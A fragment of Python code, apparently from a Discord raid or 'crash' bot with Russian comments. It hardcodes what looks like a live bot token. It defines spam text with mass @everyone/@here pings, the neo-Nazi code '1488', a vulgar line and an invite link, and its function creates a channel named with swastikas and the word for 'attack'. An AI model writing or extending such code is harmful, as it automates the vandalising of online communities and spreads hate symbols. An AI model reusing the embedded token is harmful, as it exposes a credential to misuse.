...
token = 'MTA5NTgzMDQ3MzUzMzU2NzA4OA.GroDg6.2qS6_4PMUT8v30MOnIexsChJNrS0UCJEN-IiTQ' # токен бота
spamtext = '@everyone @here\n1488\n пацики с большими писями: https://discord.gg/jEZVrMRz' # текст спама при краше
...
async def createchannel(ctx):
    try: c = await ctx.guild.create_text_channel('卐‎нападение卐‎')
    except: pass
